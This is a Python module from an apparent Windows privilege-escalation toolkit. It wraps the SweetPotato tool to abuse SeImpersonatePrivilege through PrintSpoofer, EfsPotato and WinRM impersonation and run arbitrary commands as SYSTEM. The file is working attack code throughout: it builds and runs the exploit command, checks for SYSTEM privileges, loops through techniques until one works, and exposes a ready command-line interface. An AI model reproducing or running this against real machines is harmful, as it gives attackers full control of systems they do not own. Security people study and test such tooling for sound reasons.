import os
from typing import Tuple, Optional, List
from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import PotatoExploitBase


class SweetPotatoExploit(PotatoExploitBase):
    """Exploit using SweetPotato for privilege escalation."""

    # Available techniques in SweetPotato
    TECHNIQUES = {
        'printspoofer': 'Uses Print Spooler named pipe impersonation',
        'efspotato': 'Uses EFS RPC calls for impersonation',
        'winrm': 'Uses WinRM BeaconNotify for impersonation'
    }

    def __init__(self, output_dir: str = "token_impersonation"):
        """
        Initialize the SweetPotato exploit module.

        Args:
            output_dir: Directory for storing output files
        """
        super().__init__("sweetpotato", output_dir)
        self.tool_path = "C:\\Windows\\Temp\\SweetPotato.exe"
        self.log("SweetPotato exploit module initialized", "SUCCESS")

    def get_requirements(self) -> dict:
        """
        Get the requirements for this exploit.

        Returns:
            Dictionary with requirement information
        """
        return {
            'privilege': 'SeImpersonatePrivilege',
            'min_windows': 'Windows 10 / Server 2016',
            'tool_url': self.TOOL_URLS['sweetpotato'],
            'description': 'Multi-technique Potato exploitation',
            'techniques': list(self.TECHNIQUES.keys())
        }

    def list_techniques(self) -> None:
        """Print available exploitation techniques."""
        print("\n" + "=" * 60)
        print("AVAILABLE TECHNIQUES")
        print("=" * 60)

        for tech, desc in self.TECHNIQUES.items():
            print(f"\n    {tech}")
            print(f"        {desc}")

        print(f"\n[*] Default: Tries all techniques in order")

    def exploit(self, command: str = "cmd.exe",
                technique: str = None,
                args: str = None) -> Tuple[bool, str]:
        """
        Execute SweetPotato privilege escalation.

        Args:
            command: Command/program to execute as SYSTEM
            technique: Specific technique to use (auto if not provided)
            args: Additional arguments to pass

        Returns:
            Tuple of (success, output)
        """
        self.log(f"Attempting privilege escalation with SweetPotato...")

        if technique:
            self.log(f"Using technique: {technique}")
        else:
            self.log(f"Auto-selecting best technique")

        self.log(f"Target command: {command}")

        # Verify tool exists
        if not self.check_tool_exists():
            return False, f"Tool not found: {self.tool_path}"

        # Build command
        cmd_parts = [self.tool_path, f'-p "{command}"']

        if technique:
            cmd_parts.append(f'-m {technique}')

        if args:
            cmd_parts.append(args)

        cmd = ' '.join(cmd_parts)

        self.log(f"Executing: {cmd}")

        try:
            result = self.run_command(cmd, timeout=60)

            output = result.stdout + result.stderr

            self.log("Command output:", "INFO")
            for line in output.split('\n'):
                if line.strip():
                    print(f"    {line}")

            # Check for success
            if self.verify_system_privileges(output):
                self.log("SUCCESS! Escalated to SYSTEM", "SUCCESS")
                return True, output
            else:
                self.log("Escalation may have failed", "WARNING")
                return False, output

        except Exception as e:
            self.log(f"SweetPotato failed: {e}", "ERROR")
            return False, str(e)

    def exploit_with_printspoofer(self, command: str = "cmd.exe") -> Tuple[bool, str]:
        """
        Execute using the PrintSpoofer technique.

        Args:
            command: Command to execute as SYSTEM

        Returns:
            Tuple of (success, output)
        """
        return self.exploit(command=command, technique="printspoofer")

    def exploit_with_efspotato(self, command: str = "cmd.exe") -> Tuple[bool, str]:
        """
        Execute using the EfsPotato technique.

        Args:
            command: Command to execute as SYSTEM

        Returns:
            Tuple of (success, output)
        """
        return self.exploit(command=command, technique="efspotato")

    def exploit_with_winrm(self, command: str = "cmd.exe") -> Tuple[bool, str]:
        """
        Execute using the WinRM technique.

        Args:
            command: Command to execute as SYSTEM

        Returns:
            Tuple of (success, output)
        """
        return self.exploit(command=command, technique="winrm")

    def try_all_techniques(self, command: str = "whoami") -> Optional[str]:
        """
        Try all techniques until one works.

        Args:
            command: Command to execute

        Returns:
            Working technique name or None
        """
        self.log("Trying all techniques...")

        for technique in self.TECHNIQUES.keys():
            self.log(f"Trying: {technique}")

            success, output = self.exploit(
                command=command,
                technique=technique
            )

            if success:
                self.log(f"Working technique: {technique}", "SUCCESS")
                return technique

        self.log("No working technique found", "ERROR")
        return None


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="SweetPotato Exploit")
    parser.add_argument('--command', '-c', default='whoami',
                        help='Command to execute as SYSTEM')
    parser.add_argument('--technique', '-m',
                        choices=['printspoofer', 'efspotato', 'winrm'],
                        help='Specific technique to use')
    parser.add_argument('--tool-path', '-t',
                        help='Path to SweetPotato.exe')
    parser.add_argument('--list', action='store_true',
                        help='List available techniques')
    parser.add_argument('--try-all', action='store_true',
                        help='Try all techniques')

    args = parser.parse_args()

    exploit = SweetPotatoExploit()

    if args.tool_path:
        exploit.set_tool_path(args.tool_path)

    if args.list:
        exploit.list_techniques()
    elif args.try_all:
        exploit.try_all_techniques(args.command)
    else:
        success, output = exploit.exploit(
            command=args.command,
            technique=args.technique
        )
        print(f"\n[{'SUCCESS' if success else 'FAILED'}]")